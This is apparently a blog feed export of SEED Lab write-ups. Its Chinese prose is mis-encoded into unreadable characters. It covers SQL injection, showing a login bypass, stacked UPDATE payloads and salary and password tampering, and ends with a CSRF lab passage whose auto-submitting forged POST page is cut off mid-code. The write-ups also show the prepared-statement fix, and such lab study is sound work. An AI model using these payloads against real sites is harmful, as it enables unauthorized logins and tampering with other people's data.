    <content type="html"><![CDATA[<h1 id="SQL-æ³¨å…¥åŸç†"><a href="#SQL-æ³¨å…¥åŸç†" class="headerlink" title="SQL æ³¨å…¥åŸç†"></a>SQL æ³¨å…¥åŸç†</h1><p>ä¸‹å›¾å¯ä»¥å¾ˆå¥½çš„è¡¨ç¤ºSQLæ³¨å…¥ï¼Œè½¦ç‰Œè¢«è¯†åˆ«åï¼Œç³»ç»Ÿä¼šæ‰§è¡Œdrop databaseæŒ‡ä»¤åˆ é™¤æ•°æ®åº“</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ec8ce91818ae7d3080bdeb55586a55a5.png"></p><p><strong>ä¸‹é¢çš„æ¼«ç”»ä¸­ï¼Œè¯¥å­¦ç”Ÿçš„å§“åä¸ºâ€œRobertâ€™); DROP TABLE students;â€“â€ï¼Œå¯¼è‡´studentsè¡¨è¢«åˆ é™¤ï¼š</strong></p><p><img src="https://img-blog.csdnimg.cn/img_convert/5c3cc846a007cb39ab09a6b88c7526ba.png"></p><p>åœ¨è¾“å…¥çš„å­—ç¬¦ä¸²ä¹‹ä¸­æ³¨å…¥SQLæŒ‡ä»¤ï¼Œæ¶æ„æŒ‡ä»¤å°±ä¼šè¢«æ•°æ®åº“æœåŠ¡å™¨è¯¯è®¤ä¸ºæ˜¯æ­£å¸¸çš„SQLæŒ‡ä»¤è€Œè¿è¡Œï¼Œé­åˆ°ç ´åæˆ–æ˜¯å…¥ä¾µ</p><p>ä¾‹å¦‚ï¼ŒæŸä¸ªç½‘ç«™çš„ç™»å½•éªŒè¯çš„SQLæŸ¥è¯¢ä»£ç ä¸º</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">strSQL = <span class="hljs-string">&quot;SELECT * FROM users WHERE (name = &#x27;&quot;</span> + userName + <span class="hljs-string">&quot;&#x27;) and (pw = &#x27;&quot;</span>+ passWord +<span class="hljs-string">&quot;&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>æ¶æ„å¡«å…¥</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">userName = <span class="hljs-string">&quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span>;<br></code></pre></td></tr></table></figure><p>ä¸</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">passWord = <span class="hljs-string">&quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span>;<br></code></pre></td></tr></table></figure><p>æ—¶ï¼Œå°†å¯¼è‡´åŸæœ¬çš„SQLå­—ç¬¦ä¸²è¢«å¡«ä¸º</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">strSQL = <span class="hljs-string">&quot;SELECT * FROM users WHERE (name = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;) and (pw = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>å®é™…ä¸Šè¿è¡Œçš„SQLå‘½ä»¤ä¼šå˜æˆä¸‹é¢è¿™æ ·çš„</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">strSQL = <span class="hljs-string">&quot;SELECT * FROM users;&quot;</span><br></code></pre></td></tr></table></figure><p>ä»è€Œè¾¾åˆ°æ— è´¦å·å¯†ç ç™»å½•ç½‘ç«™ã€‚æ‰€ä»¥SQLæ³¨å…¥è¢«ä¿—ç§°ä¸º<strong>é»‘å®¢çš„å¡«ç©ºæ¸¸æˆã€‚</strong></p><h2 id="SQL-Injectionä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼šå•å¼•å·-39-39-ä¸äº•å·"><a href="#SQL-Injectionä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼šå•å¼•å·-39-39-ä¸äº•å·" class="headerlink" title="SQL Injectionä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼šå•å¼•å·&#39;&#39;ä¸äº•å·#"></a>SQL Injectionä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼šå•å¼•å·<code>&#39;&#39;</code>ä¸äº•å·<code>#</code></h2><p>è¾“å…¥æ•°æ®ä¸¤ç«¯éƒ½ä¼šè¢«åŠ ä¸Šå¼•å·<code>&#39;&#39;</code>ä½œä¸ºSQLè¯­å¥çš„ä¸€éƒ¨åˆ†</p><p>æ¯”å¦‚ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªè¾“å…¥çª—å£ï¼š</p><p><img src="https://img-blog.csdnimg.cn/img_convert/44fb127eee93184340f3ad7cc69800ad.png"></p><p>å®é™…ä¸Šå®ƒçš„å½¢å¼ï¼š</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f321fe94d6da7e76b09bd1fa44299434.png"></p><p>å‡è‹¥è¾“å…¥æ•°æ®åˆ†åˆ«ä¸ºï¼š<code>EID5002&#39;  #&#39;</code>   å’Œ  <code>xyz</code></p><p>åˆ™å¯¹åº”çš„SQLè¯­å¥ä¸ºï¼š</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5fdd2ba79ece2a43aeaf8023f852a8bd.png" alt="image-20210323081645971"></p><p>å¯ä»¥çœ‹åˆ°<code>#</code>åçš„å†…å®¹è¢«æ³¨é‡Š</p><p>å› æ­¤ï¼Œé€šè¿‡äººä¸ºçš„è¾“å…¥<code>&#39;&#39;</code>å’Œ<code>#</code>ï¼Œå¯ä»¥æ”¹å˜SQLè¯­å¥çš„æ„ä¹‰</p><h1 id="lab-setup"><a href="#lab-setup" class="headerlink" title="lab setup"></a>lab setup</h1><ul><li>ä¸‹è½½å®éªŒæ–‡ä»¶ï¼Œè§£å‹</li><li>å¢åŠ hostsæ˜ å°„</li><li>è¿è¡Œdocker</li></ul><h1 id="Task-1-Get-Familiar-with-SQL-Statements"><a href="#Task-1-Get-Familiar-with-SQL-Statements" class="headerlink" title="Task 1: Get Familiar with SQL Statements"></a>Task 1: Get Familiar with SQL Statements</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">docksh &lt;id&gt; #è¿›å…¥MySQLå®¹å™¨å†…éƒ¨<br><br>mysql -u root -pdees # rootèº«ä»½è¿›å…¥æ•°æ®åº“<br><br>use sqllab_users;#ä½¿ç”¨å·²åˆ›å»ºçš„sqllab_usersæ•°æ®åº“<br><br>show tables;#æ˜¾ç¤ºtable<br><br>select * from credential; # æ‰“å°å‡ºcredentialè¡¨å…¨éƒ¨ä¿¡æ¯<br><br>+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+<br>| ID | Name  | EID   | Salary | birth | SSN      | PhoneNumber | Address | Email | NickName | Password                                 |<br>+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+<br>|  1 | Alice | 10000 |  20000 | 9/20  | 10211002 |             |         |       |          | fdbe918bdae83000aa54747fc95fe0470fff4976 |<br>|  2 | Boby  | 20000 |  30000 | 4/20  | 10213352 |             |         |       |          | b78ed97677c161c1c82c142906674ad15242b2d4 |<br>|  3 | Ryan  | 30000 |  50000 | 4/10  | 98993524 |             |         |       |          | a3c50276cb120637cca669eb38fb9928b017e9ef |<br>|  4 | Samy  | 40000 |  90000 | 1/11  | 32193525 |             |         |       |          | 995b8b8c183f349b3cab0ae7fccd39133508d2af |<br>|  5 | Ted   | 50000 | 110000 | 11/3  | 32111111 |             |         |       |          | 99343bff28a7bb51cb6f22cb20a618701a2c2f58 |<br>|  6 | Admin | 99999 | 400000 | 3/5   | 43254314 |             |         |       |          | a5bdf35a1df4ea895905f6f6618e83951a6effc0 |<br>+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+<br>6 rows in set (0.02 sec)<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$input_uname</span> = <span class="hljs-variable">$_GET</span>[â€™usernameâ€™];<br><span class="hljs-variable">$input_pwd</span> = <span class="hljs-variable">$_GET</span>[â€™Passwordâ€™];<br><span class="hljs-variable">$hashed_pwd</span> = sha1(<span class="hljs-variable">$input_pwd</span>);<br>...<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT id, name, eid, salary, birth, ssn, address, email,</span><br><span class="hljs-string">nickname, Password</span><br><span class="hljs-string">FROM credential</span><br><span class="hljs-string">WHERE name= â€™<span class="hljs-subst">$input_uname</span>â€™ and Password=â€™<span class="hljs-subst">$hashed_pwd</span>â€™&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span> -&gt; query(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡º$input_unameæœ‰æ³¨å…¥æ¼æ´</p><h1 id="Task-2-SQL-Injection-Attack-on-SELECT-Statement"><a href="#Task-2-SQL-Injection-Attack-on-SELECT-Statement" class="headerlink" title="Task 2: SQL Injection Attack on SELECT Statement"></a>Task 2: SQL Injection Attack on SELECT Statement</h1><p><a href="http://www.seed-server.com/">www.seed-server.com</a> æ˜¯æˆ‘ä»¬è¦æ”»å‡»çš„ç½‘ç«™</p><h2 id="Task-2-1-SQL-Injection-Attack-from-webpage"><a href="#Task-2-1-SQL-Injection-Attack-from-webpage" class="headerlink" title="Task 2.1: SQL Injection Attack from webpage."></a>Task 2.1: SQL Injection Attack from webpage.</h2><ul><li>usernameï¼šadminâ€™#</li><li>passwdï¼šéšæ„</li></ul><p>æˆåŠŸä»¥adminèº«ä»½è¿›å…¥</p><h2 id="Task-2-2-SQL-Injection-Attack-from-command-line"><a href="#Task-2-2-SQL-Injection-Attack-from-command-line" class="headerlink" title="Task 2.2: SQL Injection Attack from command line."></a>Task 2.2: SQL Injection Attack from command line.</h2><p>åœ¨ä¸ä½¿ç”¨ç½‘é¡µçš„æƒ…å†µä¸‹å®Œæˆä¸Šè¿°2.1çš„æ³¨å…¥ï¼Œæ¯”å¦‚å‘½ä»¤è¡Œçš„curlå‘½ä»¤</p><p>curlè¯­å¥ä¸­è¦å¯¹ä¸€äº›å­—ç¬¦è¿›è¡Œç¼–ç ï¼Œæ¯”å¦‚æ’‡å·ã€ç©ºæ ¼ã€äº•å·ï¼Œåˆ†åˆ«å¯¹åº”%27ã€%20ã€%23ï¼Œè¯¦è§<a href="https://www.w3schools.com/tags/ref_urlencode.ASP">https://www.w3schools.com/tags/ref_urlencode.ASP</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl &#x27;http://www.seed-server.com/unsafe_home.php?username=admin%27%23&#x27;<br></code></pre></td></tr></table></figure><p>æˆåŠŸè·å–å¯¹åº”çš„ç½‘é¡µæºç </p><h2 id="Task-2-3-Append-a-new-SQL-statement"><a href="#Task-2-3-Append-a-new-SQL-statement" class="headerlink" title="Task 2.3: Append a new SQL statement."></a>Task 2.3: Append a new SQL statement.</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-string">&#x27;or Name=&#x27;</span><span class="hljs-keyword">Admin</span><span class="hljs-string">&#x27;;UPDATE credential  SET Salary = &#x27;</span><span class="hljs-number">88888</span><span class="hljs-string">&#x27; WHERE Name=&#x27;</span>Alic<span class="hljs-string">e&#x27;;# åœ¨usernameä¸­</span><br><span class="hljs-string"></span><br><span class="hljs-string">There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="hljs-keyword">UPDATE</span> credential <span class="hljs-keyword">SET</span> Salary = <span class="hljs-string">&#x27;88888&#x27;</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-type">Name</span>=<span class="hljs-string">&#x27;Alice&#x27;</span>;#<span class="hljs-string">&#x27; and Password=&#x27;</span>da39<span class="hljs-string">&#x27; at line 3]\n</span><br></code></pre></td></tr></table></figure><p>è¿™è¯´æ˜åˆ†å·å‰åè¢«åˆ†å‰²ä¸ºä¸¤ä¸ªè¯­å¥</p><h1 id="Task-3-SQL-Injection-Attack-on-UPDATE-Statement"><a href="#Task-3-SQL-Injection-Attack-on-UPDATE-Statement" class="headerlink" title="Task 3: SQL Injection Attack on UPDATE Statement"></a>Task 3: SQL Injection Attack on UPDATE Statement</h1><p>edit profileçš„æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$hashed_pwd</span> = sha1(<span class="hljs-variable">$input_pwd</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE credential SET</span><br><span class="hljs-string">        nickname=â€™<span class="hljs-subst">$input_nickname</span>â€™,</span><br><span class="hljs-string">        email=â€™<span class="hljs-subst">$input_email</span>â€™,</span><br><span class="hljs-string">        address=â€™<span class="hljs-subst">$input_address</span>â€™,</span><br><span class="hljs-string">        Password=â€™<span class="hljs-subst">$hashed_pwd</span>â€™,</span><br><span class="hljs-string">        PhoneNumber=â€™<span class="hljs-subst">$input_phonenumber</span>â€™</span><br><span class="hljs-string">        WHERE ID=<span class="hljs-subst">$id</span>;&quot;</span>;<br><span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure><h2 id="Task-3-1-Modify-your-own-salary"><a href="#Task-3-1-Modify-your-own-salary" class="headerlink" title="Task 3.1: Modify your own salary."></a>Task 3.1: Modify your own salary.</h2><p>æ³¨å…¥å¦‚ä¸‹ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-string">&#x27;,Salary=&#x27;</span><span class="hljs-number">99999999&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h2 id="Task-3-2-Modify-other-peopleâ€™-salary"><a href="#Task-3-2-Modify-other-peopleâ€™-salary" class="headerlink" title="Task 3.2: Modify other peopleâ€™ salary."></a>Task 3.2: Modify other peopleâ€™ salary.</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-string">&#x27;,salary=&#x27;</span><span class="hljs-number">1&#x27;</span> <span class="hljs-keyword">where</span> name=<span class="hljs-string">&#x27;Boby&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h2 id="Task-3-3-Modify-other-peopleâ€™-password"><a href="#Task-3-3-Modify-other-peopleâ€™-password" class="headerlink" title="Task 3.3: Modify other peopleâ€™ password."></a>Task 3.3: Modify other peopleâ€™ password.</h2><p>å…ˆæŠŠnmslè½¬åŒ–ä¸ºsha1ï¼Œç„¶åå¡«å…¥passwordå­—æ®µæ–¹å¯é€šè¿‡nmslç™»å½•æˆåŠŸ</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&#x27;,password=&#x27;nmsl&#x27; <span class="hljs-keyword">where</span> <span class="hljs-built_in">name</span>=&#x27;Boby&#x27;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h1 id="Task-4-Countermeasure-â€”-Prepared-Statement"><a href="#Task-4-Countermeasure-â€”-Prepared-Statement" class="headerlink" title="Task 4: Countermeasure â€” Prepared Statement"></a>Task 4: Countermeasure â€” Prepared Statement</h1><p>é¢„é˜²SQLæ³¨å…¥çš„æ–¹æ³•ï¼šä½¿ç”¨é¢„å¤„ç†æœºåˆ¶ï¼Œå®ç°ä»£ç ä¸æ•°æ®åˆ†ç¦»</p><p>å¯ä»¥æŠŠåŸå…ˆä»£ç é€šè¿‡é¢„å¤„ç†è¿›è¡Œæ”¹å†™ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$conn</span> = getDB();<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;prepare(<span class="hljs-string">&quot;SELECT name, local, gender</span><br><span class="hljs-string">FROM USER_TABLE</span><br><span class="hljs-string">WHERE id = ? and password = ? &quot;</span>);<br><span class="hljs-comment">// Bind parameters to the query</span><br><span class="hljs-variable">$stmt</span>-&gt;bind_param(<span class="hljs-string">&quot;is&quot;</span>, <span class="hljs-variable">$id</span>, <span class="hljs-variable">$pwd</span>);<br><span class="hljs-variable">$stmt</span>-&gt;execute();<br><span class="hljs-variable">$stmt</span>-&gt;bind_result(<span class="hljs-variable">$bind_name</span>, <span class="hljs-variable">$bind_local</span>, <span class="hljs-variable">$bind_gender</span>);<br><span class="hljs-variable">$stmt</span>-&gt;fetch();<br></code></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°†å‘æ•°æ®åº“å‘é€SQLè¯­å¥çš„è¿‡ç¨‹åˆ†ä¸ºä¸¤ä¸ªæ­¥éª¤</p><ul><li>ä»…å‘é€ä»£ç éƒ¨åˆ†ï¼Œå³ä¸åŒ…å«å®é™…æ•°æ®çš„SQLè¯­å¥ã€‚è¿™æ˜¯å‡†å¤‡æ­¥éª¤ã€‚ä»ä¸Šé¢çš„ä»£ç ç‰‡æ®µå¯ä»¥çœ‹å‡ºï¼Œå®é™…æ•°æ®è¢«é—®å·ï¼Ÿä»£æ›¿ã€‚</li><li>ä½¿ç”¨bind param()å°†æ•°æ®å‘é€åˆ°æ•°æ®åº“ã€‚æ•°æ®åº“å°†åœ¨æ­¤æ­¥éª¤ä¸­å‘é€çš„æ‰€æœ‰å†…å®¹ <strong>ä»…è§†ä¸ºæ•°æ®ï¼Œä¸å†è§†ä¸ºä»£ç ã€‚</strong> å®ƒå°†æ•°æ®ç»‘å®šåˆ°å‡†å¤‡å¥½çš„è¯­å¥çš„ç›¸åº”é—®å·ã€‚</li></ul><p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬å°†ä»£ç ä¸æ•°æ®åšåˆ°äº†åˆ†ç¦»ï¼Œä»è€Œé˜²æ­¢äº†SQLæ³¨å…¥çš„å¯èƒ½æ€§</p>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-labï¼šCross-Site Request Forgery Attack Lab</title>
    <link href="/p/cb388511/"/>
    <url>/p/cb388511/</url>
    
    <content type="html"><![CDATA[<h1 id="CSRFåŸç†"><a href="#CSRFåŸç†" class="headerlink" title="CSRFåŸç†"></a>CSRFåŸç†</h1><p>è·¨ç«™è„šæœ¬æ”»å‡»</p><p>åŸç†</p><ul><li>åŒç«™è¯·æ±‚<ul><li>ä¸€ä¸ªæ¥è‡ªexample.comçš„ç½‘é¡µå‘example.comå‘é€è¯·æ±‚</li></ul></li><li>è·¨ç«™è¯·æ±‚<ul><li>evil.comå‘example.comå‘é€è¯·æ±‚</li></ul></li></ul><p><strong>å‡è®¾å—å®³è€…è®¿é—®äº†evil.comï¼Œè¯¥ç½‘é¡µä¸­åµŒå…¥äº†jsä»£ç ï¼Œè¿›è¡Œäº†è·¨ç«™è¯·æ±‚ï¼Œæµè§ˆå™¨åœ¨è¯·æ±‚å‘èµ·æ—¶é™„åŠ æ‰€æœ‰å±äºexample.comçš„cookiesï¼Œé‚£ä¹ˆå°±ä¼šé€ æˆè·¨ç«™è„šæœ¬æ”»å‡»</strong></p><p>ä¸€ä¸ªgetè¯·æ±‚ç¤ºä¾‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>This page forges an HTTP GET request.<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.csrflabelgg.com/action/friends/add?friend=59&quot;</span> </span><br><span class="hljs-tag">            <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;image&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>src</code>å±æ€§æŒ‡å®šä¸€ä¸ªURL <code>http://www.csrflabelgg.com/action/friends/add?friend=59</code>ï¼Œå®ƒä¼¼ä¹æ˜¯å¸¦æœ‰<code>friend</code>å‚æ•°çš„HTTP GETè¯·æ±‚çš„URLã€‚å¦‚æœç”¨æˆ·è®¿é—®äº†è¿™ä¸ªé¡µé¢å¹¶ä¸”å·²ç»ç™»é™†åˆ°csrflabelgg.comç½‘ç«™ï¼Œåˆ™è¯¥ GET è¯·æ±‚ä¼šå‘è¯¥ç½‘ç«™å‘é€<code>friend=59</code>å‚æ•°çš„è¯·æ±‚</p><p>é˜²å¾¡ï¼šå¯ä»¥åœ¨headerä¸­å¢åŠ csrf_token</p><h1 id="lab-setup"><a href="#lab-setup" class="headerlink" title="lab setup"></a>lab setup</h1><p>ä¸‹è½½labæ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -q https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip -o Labsetup.zip<br></code></pre></td></tr></table></figure><p>è§£å‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">unzip Labsetup.zip<br></code></pre></td></tr></table></figure><p>è¿è¡Œå®¹å™¨</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dcbuild</span> <span class="hljs-comment">#docker-composeæ„å»ºé•œåƒ</span><br>dcup <span class="hljs-comment">#è¿è¡Œå®¹å™¨</span><br></code></pre></td></tr></table></figure><p>ä¿®æ”¹hostsæ–‡ä»¶å¢åŠ dnsæ˜ å°„</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.9.0.5</span> www.seed-server.com<br><span class="hljs-number">10.9.0.5</span> www.example32.com<br><span class="hljs-number">10.9.0.105</span> www.attacker32.com<br></code></pre></td></tr></table></figure><h1 id="Task-1-Observing-HTTP-Request"><a href="#Task-1-Observing-HTTP-Request" class="headerlink" title="Task 1: Observing HTTP Request"></a>Task 1: Observing HTTP Request</h1><p>ç”±äºæˆ‘ä»¬éœ€è¦ä¼ªé€  HTTP è¯·æ±‚ï¼Œå› æ­¤éœ€è¦è§‚å¯Ÿåˆæ³•çš„httpè¯·æ±‚æ˜¯ä»€ä¹ˆæ ·å­ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨HTTP Header Liveç»™Get/Postè¯·æ±‚æŠ“åŒ…</p><h1 id="Task-2-CSRF-Attack-using-GET-Request"><a href="#Task-2-CSRF-Attack-using-GET-Request" class="headerlink" title="Task 2: CSRF Attack using GET Request"></a>Task 2: CSRF Attack using GET Request</h1><blockquote><p><code>__elgg_ts</code>å’Œ<code>__elgg_token</code>æ˜¯ä¿æŠ¤æœºåˆ¶ï¼Œä¸ºäº†ç®€åŒ–å®éªŒéš¾åº¦ï¼Œéœ€è¦è¢«ç¦ç”¨</p></blockquote><p>æ›´æ”¹ç½‘é¡µæºç å³å¯ï¼Œä»£ç ä½äºå®¹å™¨ä¸­<code>/var/www/addfriend.html</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;html&gt;<br>    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>This page forges an HTTP GET request.<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.csrflabelgg.com/action/friends/add?friend=59&quot;</span> //ä¿®æ”¹</span></span><br><span class="hljs-tag"><span class="xml">            <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;image&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>ä»¥Aliceçš„èº«ä»½ç™»å½•Elggï¼Œç„¶åç‚¹å‡»<a href="http://www.attacker32.com/addfriend.html/">http://www.attacker32.com/addfriend.html/</a> ï¼Œå‘ç°å¥½å‹å·²ç»è¢«æ·»åŠ </p><h1 id="Task-3-CSRF-Attack-using-POST-Request"><a href="#Task-3-CSRF-Attack-using-POST-Request" class="headerlink" title="Task 3: CSRF Attack using POST Request"></a>Task 3: CSRF Attack using POST Request</h1><p>ç‚¹å‡»edit profileï¼Œç„¶åæŠ“åŒ…çœ‹è¿™ä¸ªè¡Œä¸ºå¯¼è‡´äº†ä»€ä¹ˆæ ·çš„postè¯·æ±‚</p><ul><li>acesslevelçš„å€¼2å°†å­—æ®µçš„è®¿é—®çº§åˆ«è®¾ç½®ä¸º publicï¼Œå¦åˆ™å…¶ä»–äººæ— æ³•çœ‹åˆ°æ­¤å­—æ®µ</li><li>guidæ˜¯ç”¨æˆ·çš„èº«ä»½idï¼ŒAliceæ˜¯56</li></ul><p>æ›´æ”¹å®¹å™¨ä¸­<code>/var/www/editprofile.html</code>çš„ä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;html&gt;<br>    &lt;body&gt;<br>        &lt;h1&gt;This page forges an HTTP POST request&lt;/h1&gt;<br>        &lt;script type=&quot;text/javascript&quot;&gt;<br>            function forge_post()&#123;<br>                var fields;<br><br>                fields = &quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;name&#x27; value=&#x27;Alice&#x27;&gt;&quot;;<br>                fields += &quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;description&#x27; value=&#x27;SAMY is MY HERO&#x27;&gt;&quot;;<br>                fields += &quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;accesslevel[description] value=&#x27;2&#x27;&gt;&quot;;<br>                fields += &quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;guid&#x27; value=&#x27;56&#x27;&gt;&quot;;<br> <br>                var p = document.createElement(&quot;form&quot;);<br>                p.action = &quot;http://www.seed-server.com/action/profile/edit&quot;;<br>                p.innerHTML = fields;<br>                p.method = &quot;post&quot;;<br>                document.body.appendChild(p);<br>                p.submit();<br>            &#125;<br><br>            window.onload = function() &#123;<br>                forge_post();<br>            &#125;<br>        &lt;/script&gt;<br>    